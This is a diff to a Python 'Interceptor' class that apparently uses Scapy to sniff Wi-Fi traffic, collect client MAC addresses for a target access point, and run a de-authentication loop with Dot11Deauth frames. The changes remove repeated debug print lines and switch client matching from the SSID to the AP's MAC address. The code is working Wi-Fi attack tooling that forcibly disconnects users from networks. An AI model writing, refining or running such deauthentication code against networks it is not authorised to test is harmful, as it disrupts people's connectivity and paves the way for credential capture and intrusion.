@@ -142,45 +142,10 @@ class Interceptor:
         try:
             if self._packet_confirms_client(pkt):
                 ap_mac = str(pkt.addr3)
-                printf(ap_mac)
-                printf(ap_mac)
-                printf(ap_mac)
-                printf(ap_mac)
-                printf(ap_mac)
-                printf(ap_mac)
-                printf(ap_mac)
-                printf(ap_mac)
-                printf(ap_mac)
-                printf(ap_mac)
-                ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
-                printf(ssid)
-                printf(ssid)
-                printf(ssid)
-                printf(ssid)
-                printf(ssid)
-                printf(ssid)
-                printf(ssid)
-                printf(ssid)
-                printf(ssid)
-                printf(str(ssid == self.target_ssid))
-                printf(str(ssid == self.target_ssid))
-                printf(str(ssid == self.target_ssid))
-                printf(str(ssid == self.target_ssid))
-                printf(str(ssid == self.target_ssid))
-                printf(str(ssid == self.target_ssid))
-                printf(str(ssid == self.target_ssid))
-                printf(str(ssid == self.target_ssid))
-                printf(str(ssid == self.target_ssid))
-
-                if ssid == self.target_ssid:
-                    printf("got in")
-                    printf("got in")
-                    printf("got in")
-                    printf("got in")
-                    printf("got in")
+                if ap_mac == self._active_aps[self.target_ssid]["mac_addr"]:
                     c_mac = pkt.addr1
-                    if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[ssid]["clients"]:
-                        self._active_aps[ssid]["clients"].append(c_mac)
+                    if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[self.target_ssid]["clients"]:
+                        self._active_aps[self.target_ssid]["clients"].append(c_mac)
         except:
             pass
 
@@ -198,7 +163,7 @@ class Interceptor:
         try:
             printf(f"[*] Starting de-auth loop...")
 
-            ap_mac = [self._active_aps[self.target_ssid]["mac_addr"]]
+            ap_mac = self._active_aps[self.target_ssid]["mac_addr"]
 
             rd_frm = RadioTap()
             deauth_frm = Dot11Deauth(reason=7)
